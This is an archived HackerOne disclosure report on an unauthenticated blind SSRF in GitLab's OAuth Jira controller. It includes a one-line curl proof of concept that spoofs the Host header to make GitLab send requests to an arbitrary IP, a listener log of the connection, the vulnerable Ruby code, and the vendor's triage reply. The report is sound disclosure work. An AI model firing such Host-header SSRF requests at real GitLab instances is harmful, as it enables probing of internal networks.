---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/server-side-request-forgery-ssrf
  - env/web
  - stack/gitlab
  - vuln/ssrf
substate: "resolved"
weakness: "Server-Side Request Forgery (SSRF)"
enriched: true
body: true
date: 2019-03-14
submitted: 2018-08-24T03:05:22.400Z
bounty_usd: 4000
votes: 238
cve: []
program: "[[programs/gitlab|GitLab]]"
reporter: "jobert"
source: "https://hackerone.com/reports/398799"
title: "Unauthenticated blind SSRF in OAuth Jira authorization controller"
---
# Unauthenticated blind SSRF in OAuth Jira authorization controller

> **Severity:** High | **Bounty:** 4,000 USD | **Votes:** 238 | **Program:** GitLab | **Disclosed:** 2019-03-14

- Report: [https://hackerone.com/reports/398799](https://hackerone.com/reports/398799)
- CWE: Server-Side Request Forgery (SSRF)
- Submitted: 2018-08-24T03:05:22.400Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

The `Oauth::Jira::AuthorizationsController#access_token` endpoint is vulnerable to a blind SSRF vulnerability. The vulnerability allows an attacker to make arbitrary HTTP/HTTPS requests inside a GitLab instance's network.

# Proof of concept
To reproduce the vulnerability, follow the steps below.

 - spin up a GitLab EE instance with the latest version (11.2.1-ee)
 - send a `POST` request to the `/-/jira/login/oauth/callback` endpoint, as shown below. In the request, point the `Host` header to the hostname / IP address and port number you want to send the request to:

```
curl -X POST -H 'Host: 162.243.147.21:81' 'https://gitlab.com/-/jira/login/oauth/access_token'
```

 - Observe a `POST` request being sent to `162.243.147.21:81` (in this case HTTPS):

```
Listening on [0.0.0.0] (family 0, port 81)
Connection from [35.231.137.154] port 81 [tcp/*] accepted (family 2, sport 58558)
��ؒ����
��/$����4�i�,�֟J%>�+�/�,�0�����#�'�	��$�(�
�gk39@j28��<=/5�l162.243.147.21

 Connection closed, listening again.
```

# Vulnerable code
The following code can be found in the `Oauth::Jira::AuthorizationsController#access_token` method.

```ruby
def access_token
  auth_params = params
                  .slice(:code, :client_id, :client_secret)
                  .merge(grant_type: 'authorization_code', redirect_uri: oauth_jira_callback_url)

  auth_response = Gitlab::HTTP.post(oauth_token_url, body: auth_params, allow_local_requests: true)
  token_type, scope, token = auth_response['token_type'], auth_response['scope'], auth_response['access_token']

  render text: "access_token=#{token}&scope=#{scope}&token_type=#{token_type}"
end
```

The `GItlab::HTTP.post` call is using the `oauth_token_url` directly. This `_url` Rails routing helper uses the `Host` header to construct the URL it needs to point to. Because every host is accepted in GitLab, the constructed URL can point to an internal system. This is how it's supposed to work. However, the `Host` header should be checked before making the `post` call to avoid an attacker being able to make arbitrary requests.

## Impact

The response of the server is actually interpreted, but this is limited to a JSON response that returns an `access_token`, `scope`, and `token_type`. However, this may have additional consequences in case there are unauthenticated endpoints within the instance's network. This isn't very likely, which is why the attack complexity is set to High. It has a minor impact on Availability, because a thread is blocked on the TCP read timeout, which is set to 60 seconds (`curl -X POST -H 'Host: 162.243.147.21:81'   0.03s user 0.01s system 0% cpu 1:00.76 total`). The integrity impact is currently set at High, but this depends on additional factors, such as what other internal services can be hit. The user does not need to be authenticated to execute the call.

## Timeline

- **Report Filed**
- **Report Triaged**
- **2018-09-04** @jritchey: Hi @jobert ,

Thank you for submitting this report. I've validated that this is an SSRF issue. We are working internally on resolving the issue at https://gitlab.com/gitlab-org/gitlab-ce/issues/50748. We are working to get this patched immediately.

The issue will be made public 30 days after a patch has been released. We will keep you updated on our progress via HackerOne.

Best regards,
James
- **Bounty Awarded**
- **Report Resolved**
- **Agreed On Going Public**
- **Report Became Public**
